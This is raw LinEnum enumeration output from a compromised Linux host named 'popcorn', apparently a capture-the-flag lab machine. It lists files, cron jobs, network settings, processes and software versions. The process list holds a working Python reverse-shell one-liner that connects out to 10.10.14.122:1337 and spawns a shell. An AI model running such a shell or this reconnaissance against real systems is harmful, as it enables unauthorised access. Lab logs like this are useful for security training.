+-rw-r--r-- 1 root root 2180 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/mod/.file2alias.o.cmd
+-rw-r--r-- 1 root root 109 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/mod/.elfconfig.h.cmd
+-rw-r--r-- 1 root root 1646 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/mod/.mk_elfconfig.cmd
+-rw-r--r-- 1 root root 2537 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/mod/.modpost.o.cmd
+-rw-r--r-- 1 root root 1438 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/mod/.empty.o.cmd
+-rw-r--r-- 1 root root 2879 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/mod/.sumversion.o.cmd
+-rw-r--r-- 1 root root 129 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/mod/.modpost.cmd
+-rw-r--r-- 1 root root 2314 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/selinux/mdp/.mdp.cmd
+-rw-r--r-- 1 root root 3572 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/kconfig/.zconf.tab.o.cmd
+-rw-r--r-- 1 root root 1976 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/kconfig/.kxgettext.o.cmd
+-rw-r--r-- 1 root root 2286 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/kconfig/.conf.o.cmd
+-rw-r--r-- 1 root root 110 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/kconfig/.conf.cmd
+-rw-r--r-- 1 root root 1571 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/.conmakehash.cmd
+-rw-r--r-- 1 root root 4242 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/kernel/.bounds.s.cmd
+-rw-r--r-- 1 root root 33724 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/arch/x86/kernel/.asm-offsets.s.cmd
+-rw-r--r-- 1 root root 85 Sep 10  2009 /usr/src/linux-headers-2.6.31-14/scripts/.gitignore
+-rw-r--r-- 1 root root 20 Sep 10  2009 /usr/src/linux-headers-2.6.31-14/scripts/basic/.gitignore
+-rw-r--r-- 1 root root 55 Sep 10  2009 /usr/src/linux-headers-2.6.31-14/scripts/dtc/.gitignore
+-rw-r--r-- 1 root root 37 Sep 10  2009 /usr/src/linux-headers-2.6.31-14/scripts/genksyms/.gitignore
+-rw-r--r-- 1 root root 34 Sep 10  2009 /usr/src/linux-headers-2.6.31-14/scripts/mod/.gitignore
+-rw-r--r-- 1 root root 21 Sep 10  2009 /usr/src/linux-headers-2.6.31-14/scripts/selinux/mdp/.gitignore
+-rw-r--r-- 1 root root 172 Sep 10  2009 /usr/src/linux-headers-2.6.31-14/scripts/kconfig/.gitignore
+-rw-r--r-- 1 root root 31 Sep 10  2009 /usr/src/linux-headers-2.6.31-14/scripts/kconfig/lxdialog/.gitignore
+-rw-r--r-- 1 root root 12 Sep 10  2009 /usr/src/linux-headers-2.6.31-14/arch/sh/include/asm/.gitignore
+
+
+[00;31m[-] World-readable files within /home:[00m
+-rw-r--r-- 1 george george 220 Mar 17  2017 /home/george/.bash_logout
+-rw-r--r-- 1 george george 3180 Mar 17  2017 /home/george/.bashrc
+-rw-r--r-- 1 george george 848727 Mar 17  2017 /home/george/torrenthoster.zip
+-rw-r--r-- 1 george george 0 Mar 17  2017 /home/george/.cache/motd.legal-displayed
+-rw-r--r-- 1 george george 0 Mar 17  2017 /home/george/.sudo_as_admin_successful
+-rw-r--r-- 1 george george 33 Feb 26 02:19 /home/george/user.txt
+-rw-r--r-- 1 george george 675 Mar 17  2017 /home/george/.profile
+
+
+[00;31m[-] Home directory contents:[00m
+total 24K
+drwxr-xr-x  4 www-data www-data 4.0K Apr 11  2017 .
+drwxr-xr-x 15 root     root     4.0K Mar 17  2017 ..
+-rw-r--r--  1 www-data www-data  177 Mar 17  2017 index.html
+drwxr-xr-x  2 www-data www-data 4.0K Mar 17  2017 rename
+-rw-r--r--  1 www-data www-data   21 Mar 17  2017 test.php
+drwxr-xr-x 15 www-data www-data 4.0K Mar 17  2017 torrent
+
+
+[00;31m[-] Root is allowed to login via SSH:[00m
+PermitRootLogin yes
+
+
+[00;33m### ENVIRONMENTAL #######################################[00m
+[00;31m[-] Environment information:[00m
+APACHE_PID_FILE=/var/run/apache2.pid
+APACHE_RUN_USER=www-data
+TERM=xterm
+PATH=/usr/local/bin:/usr/bin:/bin
+PWD=/tmp
+LANG=C
+APACHE_RUN_GROUP=www-data
+SHLVL=2
+_=/usr/bin/env
+
+
+[00;31m[-] Path information:[00m
+/usr/local/bin:/usr/bin:/bin
+drwxr-xr-x 2 root root  4096 Mar 17  2017 /bin
+drwxr-xr-x 2 root root 20480 Oct 26  2020 /usr/bin
+drwxr-xr-x 2 root root  4096 Mar 17  2017 /usr/local/bin
+
+
+[00;31m[-] Available shells:[00m
+# /etc/shells: valid login shells
+/bin/csh
+/bin/sh
+/usr/bin/es
+/usr/bin/ksh
+/bin/ksh
+/usr/bin/rc
+/usr/bin/tcsh
+/bin/tcsh
+/usr/bin/esh
+/bin/dash
+/bin/bash
+/bin/rbash
+/usr/bin/screen
+
+
+[00;31m[-] Current umask value:[00m
+u=rwx,g=rx,o=rx
+0022
+
+
+[00;31m[-] Password and storage information:[00m
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+
+[00;33m### JOBS/TASKS ##########################################[00m
+[00;31m[-] Cron jobs:[00m
+-rw-r--r-- 1 root root  724 Sep 15  2009 /etc/crontab
+
+/etc/cron.d:
+total 16
+drwxr-xr-x  2 root root 4096 Mar 17  2017 .
+drwxr-xr-x 87 root root 4096 Feb 26 02:19 ..
+-rw-r--r--  1 root root  102 Sep 15  2009 .placeholder
+-rw-r--r--  1 root root  506 May  3  2011 php5
+
+/etc/cron.daily:
+total 68
+drwxr-xr-x  2 root root  4096 Mar 17  2017 .
+drwxr-xr-x 87 root root  4096 Feb 26 02:19 ..
+-rw-r--r--  1 root root   102 Sep 15  2009 .placeholder
+-rwxr-xr-x  1 root root   633 Nov 18  2010 apache2
+-rwxr-xr-x  1 root root   189 Oct 23  2009 apport
+-rwxr-xr-x  1 root root 16338 Oct 15  2009 apt
+-rwxr-xr-x  1 root root   314 Sep 28  2009 aptitude
+-rwxr-xr-x  1 root root   502 May  9  2009 bsdmainutils
+-rwxr-xr-x  1 root root   256 Sep 20  2009 dpkg
+-rwxr-xr-x  1 root root    89 Aug 20  2009 logrotate
+-rwxr-xr-x  1 root root  1270 Sep  7  2009 man-db
+-rwxr-xr-x  1 root root   665 Apr 29  2009 mlocate
+-rwxr-xr-x  1 root root  2149 Jun 16  2009 popularity-contest
+-rwxr-xr-x  1 root root  3349 Sep 15  2009 standard
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Mar 17  2017 .
+drwxr-xr-x 87 root root 4096 Feb 26 02:19 ..
+-rw-r--r--  1 root root  102 Sep 15  2009 .placeholder
+
+/etc/cron.monthly:
+total 16
+drwxr-xr-x  2 root root 4096 Mar 17  2017 .
+drwxr-xr-x 87 root root 4096 Feb 26 02:19 ..
+-rw-r--r--  1 root root  102 Sep 15  2009 .placeholder
+-rwxr-xr-x  1 root root  129 Sep 15  2009 standard
+
+/etc/cron.weekly:
+total 20
+drwxr-xr-x  2 root root 4096 Oct  1  2020 .
+drwxr-xr-x 87 root root 4096 Feb 26 02:19 ..
+-rw-r--r--  1 root root  102 Sep 15  2009 .placeholder
+-rwxr-xr-x  1 root root 1413 Nov 11  2008 cvs
+-rwxr-xr-x  1 root root  830 Sep  7  2009 man-db
+
+
+[00;31m[-] Crontab contents:[00m
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+
+[00;33m### NETWORKING  ##########################################[00m
+[00;31m[-] Network and IP info:[00m
+eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:18:bd  
+          inet addr:10.10.10.6  Bcast:10.10.10.255  Mask:255.255.255.0
+          inet6 addr: dead:beef::250:56ff:feb9:18bd/64 Scope:Global
+          inet6 addr: fe80::250:56ff:feb9:18bd/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:1510488 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1461175 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:232681624 (232.6 MB)  TX bytes:693423868 (693.4 MB)
+          Interrupt:18 Base address:0x2024 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:1544 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1544 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:157874 (157.8 KB)  TX bytes:157874 (157.8 KB)
+
+
+[00;31m[-] ARP history:[00m
+fe80::250:56ff:feb9:d772 dev eth0 lladdr 00:50:56:b9:d7:72 router STALE
+10.10.10.2 dev eth0 lladdr 00:50:56:b9:d7:72 DELAY
+
+
+[00;31m[-] Nameserver(s):[00m
+nameserver 8.8.8.8
+nameserver 10.10.10.2
+
+
+[00;31m[-] Default route:[00m
+default via 10.10.10.2 dev eth0  metric 100 
+
+
+[00;31m[-] Listening TCP:[00m
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp6       0      0 :::80                   :::*                    LISTEN      -               
+tcp6       0      0 :::22                   :::*                    LISTEN      -               
+
+
+[00;31m[-] Listening UDP:[00m
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+
+
+[00;33m### SERVICES #############################################[00m
+[00;31m[-] Running processes:[00m
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.1   2528  1416 ?        Ss   02:19   0:01 /sbin/init
+root         2  0.0  0.0      0     0 ?        S<   02:19   0:00 [kthreadd]
+root         3  0.0  0.0      0     0 ?        S<   02:19   0:00 [migration/0]
+root         4  0.0  0.0      0     0 ?        S<   02:19   0:00 [ksoftirqd/0]
+root         5  0.0  0.0      0     0 ?        S<   02:19   0:00 [watchdog/0]
+root         6  0.0  0.0      0     0 ?        S<   02:19   0:00 [events/0]
+root         7  0.0  0.0      0     0 ?        S<   02:19   0:00 [cpuset]
+root         8  0.0  0.0      0     0 ?        S<   02:19   0:00 [khelper]
+root         9  0.0  0.0      0     0 ?        S<   02:19   0:00 [netns]
+root        10  0.0  0.0      0     0 ?        S<   02:19   0:00 [async/mgr]
+root        11  0.0  0.0      0     0 ?        S<   02:19   0:00 [kintegrityd/0]
+root        12  0.0  0.0      0     0 ?        S<   02:19   0:00 [kblockd/0]
+root        13  0.0  0.0      0     0 ?        S<   02:19   0:00 [kacpid]
+root        14  0.0  0.0      0     0 ?        S<   02:19   0:00 [kacpi_notify]
+root        15  0.0  0.0      0     0 ?        S<   02:19   0:00 [kacpi_hotplug]
+root        16  0.0  0.0      0     0 ?        S<   02:19   0:00 [ata/0]
+root        17  0.0  0.0      0     0 ?        S<   02:19   0:00 [ata_aux]
+root        18  0.0  0.0      0     0 ?        S<   02:19   0:00 [ksuspend_usbd]
+root        19  0.0  0.0      0     0 ?        S<   02:19   0:00 [khubd]
+root        20  0.0  0.0      0     0 ?        S<   02:19   0:00 [kseriod]
+root        21  0.0  0.0      0     0 ?        S<   02:19   0:00 [kmmcd]
+root        22  0.0  0.0      0     0 ?        S<   02:19   0:00 [bluetooth]
+root        23  0.0  0.0      0     0 ?        S    02:19   0:00 [khungtaskd]
+root        24  0.0  0.0      0     0 ?        S    02:19   0:00 [pdflush]
+root        25  0.0  0.0      0     0 ?        S    02:19   0:00 [pdflush]
+root        26  0.0  0.0      0     0 ?        S<   02:19   0:00 [kswapd0]
+root        27  0.0  0.0      0     0 ?        S<   02:19   0:00 [aio/0]
+root        28  0.0  0.0      0     0 ?        S<   02:19   0:00 [ecryptfs-kthrea]
+root        29  0.0  0.0      0     0 ?        S<   02:19   0:00 [crypto/0]
+root        32  0.0  0.0      0     0 ?        S<   02:19   0:00 [pciehpd]
+root        34  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_0]
+root        35  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_1]
+root        36  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_2]
+root        37  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_3]
+root        38  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_4]
+root        39  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_5]
+root        40  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_6]
+root        41  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_7]
+root        42  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_8]
+root        43  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_9]
+root        44  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_10]
+root        45  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_11]
+root        46  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_12]
+root        47  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_13]
+root        48  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_14]
+root        49  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_15]
+root        50  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_16]
+root        51  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_17]
+root        52  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_18]
+root        53  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_19]
+root        54  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_20]
+root        55  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_21]
+root        56  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_22]
+root        57  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_23]
+root        58  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_24]
+root        59  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_25]
+root        60  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_26]
+root        61  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_27]
+root        62  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_28]
+root        63  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_29]
+root        64  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_30]
+root        66  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_31]
+root        68  0.0  0.0      0     0 ?        S<   02:19   0:00 [kstriped]
+root        70  0.0  0.0      0     0 ?        S<   02:19   0:00 [kmpathd/0]
+root        72  0.0  0.0      0     0 ?        S<   02:19   0:00 [kmpath_handlerd]
+root        74  0.0  0.0      0     0 ?        S<   02:19   0:00 [ksnapd]
+root        76  0.0  0.0      0     0 ?        S<   02:19   0:00 [kondemand/0]
+root        78  0.0  0.0      0     0 ?        S<   02:19   0:00 [kconservative/0]
+root        80  0.0  0.0      0     0 ?        S<   02:19   0:00 [krfcommd]
+root       198  0.0  0.0      0     0 ?        S<   02:19   0:00 [mpt_poll_0]
+root       315  0.0  0.0      0     0 ?        S<   02:19   0:00 [mpt/0]
+root       417  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_32]
+root       431  0.0  0.0      0     0 ?        S<   02:19   0:00 [kdmflush]
+root       435  0.0  0.0      0     0 ?        S<   02:19   0:00 [kdmflush]
+root       476  0.0  0.0      0     0 ?        S<   02:19   0:00 [kjournald2]
+root       526  0.0  0.0   2284   892 ?        S    02:19   0:00 upstart-udev-bridge --daemon
+root       531  0.0  0.1   2812  1268 ?        S<s  02:19   0:00 udevd --daemon
+root       704  0.0  0.1   2764  1112 ?        S<   02:19   0:00 udevd --daemon
+root       726  0.0  0.0      0     0 ?        S<   02:19   0:00 [kpsmoused]
+root       737  0.0  0.1   2764  1112 ?        S<   02:19   0:00 udevd --daemon
+root       919  0.0  0.0   1852   540 ?        Ss   02:19   0:00 dd bs=1 if=/proc/kmsg of=/var/run/rsyslog/kmsg
+syslog     923  0.0  0.1  33568  1576 ?        Sl   02:19   0:00 rsyslogd -c4
+root      1035  0.0  0.0   1704   544 tty4     Ss+  02:19   0:00 /sbin/getty -8 38400 tty4
+root      1041  0.0  0.0   1704   544 tty5     Ss+  02:19   0:00 /sbin/getty -8 38400 tty5
+root      1044  0.0  0.0   1704   544 tty2     Ss+  02:19   0:00 /sbin/getty -8 38400 tty2
+root      1045  0.0  0.0   1704   544 tty3     Ss+  02:19   0:00 /sbin/getty -8 38400 tty3
+root      1047  0.0  0.0   1704   540 tty6     Ss+  02:19   0:00 /sbin/getty -8 38400 tty6
+daemon    1048  0.0  0.0   1964   420 ?        Ss   02:19   0:00 atd
+root      1050  0.0  0.0   2092   876 ?        Ss   02:19   0:00 cron
+root      1113  0.0  0.1   5436  1072 ?        Ss   02:19   0:00 /usr/sbin/sshd
+root      1203  0.0  0.0   1752   536 ?        S    02:19   0:00 /bin/sh /usr/bin/mysqld_safe
+root      1235  0.0  0.0      0     0 ?        S<   02:19   0:00 [vmmemctl]
+mysql     1441  0.0  1.8 147224 18632 ?        Sl   02:19   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
+root      1443  0.0  0.0   1668   544 ?        S    02:19   0:00 logger -t mysqld -p daemon.error
+root      1592  0.0  0.6  33200  6864 ?        Ss   02:19   0:00 /usr/sbin/apache2 -k start
+root      1600  0.0  0.3  17008  3812 ?        Sl   02:19   0:02 /usr/sbin/vmtoolsd
+root      1630  0.0  0.0   1704   544 tty1     Ss+  02:19   0:00 /sbin/getty -8 38400 tty1
+root      1648  0.0  0.7  13752  7684 ?        S    02:19   0:00 /usr/lib/vmware-vgauth/VGAuthService -s
+www-data  1754  0.1  0.6  33940  6896 ?        S    02:25   0:03 /usr/sbin/apache2 -k start
+www-data  1837  0.1  0.7  33932  7544 ?        S    02:29   0:02 /usr/sbin/apache2 -k start
+www-data  1854  0.0  0.6  34060  7064 ?        S    02:31   0:01 /usr/sbin/apache2 -k start
+www-data  1869  0.1  0.6  33896  6432 ?        S    02:32   0:02 /usr/sbin/apache2 -k start
+www-data  1881  0.0  0.7  34092  7512 ?        S    02:34   0:01 /usr/sbin/apache2 -k start
+www-data  1888  0.0  0.6  34060  7132 ?        S    02:35   0:01 /usr/sbin/apache2 -k start
+www-data  1890  0.0  0.6  34060  7172 ?        S    02:35   0:01 /usr/sbin/apache2 -k start
+www-data  1891  0.0  0.6  33896  6432 ?        S    02:35   0:00 /usr/sbin/apache2 -k start
+www-data  1893  0.0  0.6  33896  6688 ?        S    02:36   0:00 /usr/sbin/apache2 -k start
+www-data  1911  0.0  0.6  33896  6752 ?        S    02:38   0:00 /usr/sbin/apache2 -k start
+www-data  1948  0.0  0.0   1752   488 ?        S    02:59   0:00 sh -c python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.122",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+www-data  1949  0.0  0.3   7416  3832 ?        S    02:59   0:00 python -c import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.122",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
+www-data  1950  0.0  0.0   1752   504 pts/0    Ss   02:59   0:00 /bin/sh
+www-data  1952  0.0  0.2   5400  3040 pts/0    S+   02:59   0:00 python -c import pty;pty.spawn("/bin/bash")
+www-data  1953  0.0  0.1   3524  1904 pts/1    Ss   02:59   0:00 /bin/bash
+www-data  1986  0.0  0.1   3344  1728 pts/1    S+   03:04   0:00 /bin/bash ./LinEnum.sh -t -r popcorn
+www-data  1988  0.2  0.1   4020  1680 pts/1    R+   03:04   0:00 /bin/bash ./LinEnum.sh -t -r popcorn
+www-data  1990  0.0  0.0   1688   464 pts/1    S+   03:04   0:00 tee -a popcorn-26-02-22
+www-data  2503  0.0  0.1   4020  1404 pts/1    S+   03:04   0:00 /bin/bash ./LinEnum.sh -t -r popcorn
+www-data  2504  0.0  0.0   2364   924 pts/1    R+   03:04   0:00 ps aux
+
+
+[00;31m[-] Process binaries and associated permissions (from above list):[00m
+-rwxr-xr-x 1 root root  875596 Sep 14  2009 /bin/bash
+lrwxrwxrwx 1 root root       4 Mar 17  2017 /bin/sh -> dash
+-rwxr-xr-x 1 root root   18360 Oct 23  2009 /sbin/getty
+-rwxr-xr-x 1 root root  169676 Oct 15  2009 /sbin/init
+lrwxrwxrwx 1 root root      37 Oct 26  2020 /usr/lib/vmware-vgauth/VGAuthService -> /usr/lib/vmware-tools/bin32/appLoader
+lrwxrwxrwx 1 root root      34 Mar 17  2017 /usr/sbin/apache2 -> ../lib/apache2/mpm-prefork/apache2
+-rwxr-xr-x 1 root root 8376232 Nov 10  2010 /usr/sbin/mysqld
+-rwxr-xr-x 1 root root  414304 Oct 22  2009 /usr/sbin/sshd
+lrwxrwxrwx 1 root root      37 Oct 26  2020 /usr/sbin/vmtoolsd -> /usr/lib/vmware-tools/sbin32/vmtoolsd
+
+
+[00;31m[-] /etc/init.d/ binary permissions:[00m
+total 184
+drwxr-xr-x  2 root root  4096 Oct 26  2020 .
+drwxr-xr-x 87 root root  4096 Feb 26 02:19 ..
+-rw-r--r--  1 root root    24 Mar 17  2017 .depend.boot
+-rw-r--r--  1 root root    24 Mar 17  2017 .depend.start
+-rw-r--r--  1 root root    10 Mar 17  2017 .depend.stop
+-rw-r--r--  1 root root     0 Mar 17  2017 .legacy-bootordering
+-rw-r--r--  1 root root 12288 Oct 14  2009 .umountroot.swp
+-rw-r--r--  1 root root  1510 Sep  7  2009 README
+-rwxr-xr-x  1 root root  6461 Nov 18  2010 apache2
+-rwxr-xr-x  1 root root  3314 Oct 17  2009 apparmor
+lrwxrwxrwx  1 root root    21 Mar 17  2017 apport -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root    21 Mar 17  2017 atd -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root  2341 Sep  7  2009 bootlogd
+-rwxr-xr-x  1 root root  1670 Jul  6  2009 console-setup
+lrwxrwxrwx  1 root root    21 Mar 17  2017 cron -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root    21 Mar 17  2017 dmesg -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root  1235 Feb 20  2009 dns-clean
+-rwxr-xr-x  1 root root  1105 Oct 24  2009 grub-common
+-rwxr-xr-x  1 root root  1329 Sep  7  2009 halt
+lrwxrwxrwx  1 root root    21 Mar 17  2017 hwclock -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root    21 Mar 17  2017 hwclock-save -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root  1404 Jul  6  2009 keyboard-setup
+-rwxr-xr-x  1 root root  1293 Sep  7  2009 killprocs
+lrwxrwxrwx  1 root root    21 Mar 17  2017 module-init-tools -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root  5609 Nov 10  2010 mysql
+-rwxr-xr-x  1 root root  2070 Sep 15  2009 networking
+-rwxr-xr-x  1 root root   882 Sep  7  2009 ondemand
+-rwxr-xr-x  1 root root   420 Feb 20  2009 pppd-dns
+lrwxrwxrwx  1 root root    21 Mar 17  2017 procps -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root  8863 Sep  7  2009 rc
+-rwxr-xr-x  1 root root   801 Sep  7  2009 rc.local
+-rwxr-xr-x  1 root root   117 Sep  7  2009 rcS
+-rwxr-xr-x  1 root root   639 Sep  7  2009 reboot
+-rwxr-xr-x  1 root root  4310 Jun 25  2009 rsync
+lrwxrwxrwx  1 root root    21 Mar 17  2017 rsyslog -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root    21 Mar 17  2017 rsyslog-kmsg -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root  1055 Jul  6  2009 screen-cleanup
+-rwxr-xr-x  1 root root  2283 Sep  7  2009 sendsigs
+-rwxr-xr-x  1 root root   590 Sep  7  2009 single
+-rw-r--r--  1 root root  4271 Sep  7  2009 skeleton
+-rwxr-xr-x  1 root root  3878 Oct 22  2009 ssh
+-rwxr-xr-x  1 root root   519 Sep  7  2009 stop-bootlogd
+-rwxr-xr-x  1 root root  1095 Sep  7  2009 stop-bootlogd-single
+lrwxrwxrwx  1 root root    21 Mar 17  2017 udev -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root    21 Mar 17  2017 udev-finish -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root    21 Mar 17  2017 udevmonitor -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root    21 Mar 17  2017 udevtrigger -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root    21 Mar 17  2017 ufw -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root  2746 Oct 14  2009 umountfs
+-rwxr-xr-x  1 root root  2075 Oct 14  2009 umountnfs.sh
+-rwxr-xr-x  1 root root  1683 Oct 14  2009 umountroot
+-rwxr-xr-x  1 root root  1997 Sep  7  2009 urandom
+-rwxr-xr-x  1 root root  2327 Sep 20  2009 wpa-ifupdown
+-rwxr-xr-x  1 root root  1777 Dec  5  2008 x11-common
+
+
+[00;31m[-] /etc/init/ config file permissions:[00m
+total 144
+drwxr-xr-x  2 root root 4096 Oct 26  2020 .
+drwxr-xr-x 87 root root 4096 Feb 26 02:19 ..
+-rw-r--r--  1 root root 1271 Oct 23  2009 apport.conf
+-rw-r--r--  1 root root  261 Sep 15  2009 atd.conf
+-rw-r--r--  1 root root  356 Oct 15  2009 control-alt-delete.conf
+-rw-r--r--  1 root root  297 Sep 15  2009 cron.conf
+-rw-r--r--  1 root root  273 Oct 15  2009 dmesg.conf
+-rw-r--r--  1 root root  312 Sep 10  2009 hostname.conf
+-rw-r--r--  1 root root  444 Oct 23  2009 hwclock-save.conf
+-rw-r--r--  1 root root  557 Oct 23  2009 hwclock.conf
+-rw-r--r--  1 root root  367 Sep 16  2009 module-init-tools.conf
+-rw-r--r--  1 root root  335 Oct 26  2009 mountall-net.conf
+-rw-r--r--  1 root root  261 Oct 26  2009 mountall-reboot.conf
+-rw-r--r--  1 root root 1073 Oct 26  2009 mountall-shell.conf
+-rw-r--r--  1 root root  793 Oct 26  2009 mountall.conf
+-rw-r--r--  1 root root  493 Sep 14  2009 network-interface.conf
+-rw-r--r--  1 root root  290 Sep 15  2009 networking.conf
+-rw-r--r--  1 root root  293 Sep 16  2009 procps.conf
+-rw-r--r--  1 root root 1453 Oct 15  2009 rc-sysinit.conf
+-rw-r--r--  1 root root  354 Oct 15  2009 rc.conf
+-rw-r--r--  1 root root  822 Oct 15  2009 rcS.conf
+-rw-r--r--  1 root root  589 Oct 15  2009 rsyslog-kmsg.conf
+-rw-r--r--  1 root root  280 Oct 15  2009 rsyslog.conf
+-rw-r--r--  1 root root  228 Oct 15  2009 tty1.conf
+-rw-r--r--  1 root root  213 Oct 15  2009 tty2.conf
+-rw-r--r--  1 root root  213 Oct 15  2009 tty3.conf
+-rw-r--r--  1 root root  213 Oct 15  2009 tty4.conf
+-rw-r--r--  1 root root  213 Oct 15  2009 tty5.conf
+-rw-r--r--  1 root root  213 Oct 15  2009 tty6.conf
+-rw-r--r--  1 root root  769 Sep 22  2009 udev-finish.conf
+-rw-r--r--  1 root root  316 Sep 22  2009 udev.conf
+-rw-r--r--  1 root root  356 Sep 22  2009 udevmonitor.conf
+-rw-r--r--  1 root root  318 Sep 22  2009 udevtrigger.conf
+-rw-r--r--  1 root root  344 Sep 24  2009 ufw.conf
+-rw-r--r--  1 root root  313 Oct 15  2009 upstart-udev-bridge.conf
+-r--r--r--  1 root root  901 Oct 26  2020 vmware-tools.conf
+
+
+[00;33m### SOFTWARE #############################################[00m
+[00;31m[-] Sudo version:[00m
+Sudo version 1.7.0
+
+
+[00;31m[-] MYSQL version:[00m
+mysql  Ver 14.14 Distrib 5.1.37, for debian-linux-gnu (i486) using  EditLine wrapper
+
+
